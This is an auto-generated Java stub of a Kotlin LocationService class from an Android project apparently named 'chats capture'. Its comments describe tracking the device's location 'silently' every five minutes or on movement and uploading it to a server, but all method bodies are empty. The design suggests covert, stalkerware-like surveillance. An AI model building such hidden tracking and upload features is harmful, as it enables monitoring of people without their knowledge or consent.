package com.chats.capture.services;

/**
 * Service for tracking device location silently
 * Tracks location every 5 minutes or on significant movement
 */
@kotlin.Metadata(mv = {1, 9, 0}, k = 1, xi = 48, d1 = {"\u0000F\n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0010\t\n\u0000\n\u0002\u0010\u0007\n\u0000\n\u0002\u0010\u000b\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0010\u0002\n\u0002\b\b\u0018\u00002\u00020\u0001B\r\u0012\u0006\u0010\u0002\u001a\u00020\u0003\u00a2\u0006\u0002\u0010\u0004J\b\u0010\u0013\u001a\u0004\u0018\u00010\fJ\u0010\u0010\u0014\u001a\u00020\u00152\u0006\u0010\u0016\u001a\u00020\fH\u0002J\b\u0010\u0017\u001a\u00020\nH\u0002J\b\u0010\u0018\u001a\u00020\u0015H\u0002J\u0006\u0010\u0019\u001a\u00020\u0015J\u0006\u0010\u001a\u001a\u00020\u0015J\u0016\u0010\u001b\u001a\u00020\u00152\u0006\u0010\u0016\u001a\u00020\fH\u0082@\u00a2\u0006\u0002\u0010\u001cR\u000e\u0010\u0005\u001a\u00020\u0006X\u0082D\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0007\u001a\u00020\bX\u0082D\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0002\u001a\u00020\u0003X\u0082\u0004\u00a2\u0006\u0002\n\u0000R\u000e\u0010\t\u001a\u00020\nX\u0082\u000e\u00a2\u0006\u0002\n\u0000R\u0010\u0010\u000b\u001a\u0004\u0018\u00010\fX\u0082\u000e\u00a2\u0006\u0002\n\u0000R\u000e\u0010\r\u001a\u00020\u000eX\u0082\u0004\u00a2\u0006\u0002\n\u0000R\u0010\u0010\u000f\u001a\u0004\u0018\u00010\u0010X\u0082\u0004\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0011\u001a\u00020\u0012X\u0082\u0004\u00a2\u0006\u0002\n\u0000\u00a8\u0006\u001d"}, d2 = {"Lcom/chats/capture/services/LocationService;", "", "context", "Landroid/content/Context;", "(Landroid/content/Context;)V", "LOCATION_UPDATE_INTERVAL_MS", "", "MIN_DISTANCE_METERS", "", "isTracking", "", "lastUploadedLocation", "Landroid/location/Location;", "locationListener", "Landroid/location/LocationListener;", "locationManager", "Landroid/location/LocationManager;", "serviceScope", "Lkotlinx/coroutines/CoroutineScope;", "getCurrentLocation", "handleLocationUpdate", "", "location", "hasLocationPermission", "requestLocationUpdate", "startTracking", "stopTracking", "uploadLocation", "(Landroid/location/Location;Lkotlin/coroutines/Continuation;)Ljava/lang/Object;", "app_debug"})
public final class LocationService {
    @org.jetbrains.annotations.NotNull()
    private final android.content.Context context = null;
    @org.jetbrains.annotations.NotNull()
    private final kotlinx.coroutines.CoroutineScope serviceScope = null;
    private boolean isTracking = false;
    @org.jetbrains.annotations.Nullable()
    private android.location.Location lastUploadedLocation;
    private final long LOCATION_UPDATE_INTERVAL_MS = 300000L;
    private final float MIN_DISTANCE_METERS = 100.0F;
    @org.jetbrains.annotations.Nullable()
    private final android.location.LocationManager locationManager = null;
    
    /**
     * Location listener for receiving location updates
     */
    @org.jetbrains.annotations.NotNull()
    private final android.location.LocationListener locationListener = null;
    
    public LocationService(@org.jetbrains.annotations.NotNull()
    android.content.Context context) {
        super();
    }
    
    /**
     * Start location tracking
     */
    public final void startTracking() {
    }
    
    /**
     * Stop location tracking
     */
    public final void stopTracking() {
    }
    
    /**
     * Request location update
     */
    private final void requestLocationUpdate() {
    }
    
    /**
     * Handle location update
     */
    private final void handleLocationUpdate(android.location.Location location) {
    }
    
    /**
     * Upload location to server
     */
    private final java.lang.Object uploadLocation(android.location.Location location, kotlin.coroutines.Continuation<? super kotlin.Unit> $completion) {
        return null;
    }
    
    /**
     * Check if location permission is granted
     */
    private final boolean hasLocationPermission() {
        return false;
    }
    
    /**
     * Get current location (if available)
     */
    @org.jetbrains.annotations.Nullable()
    public final android.location.Location getCurrentLocation() {
        return null;
    }
}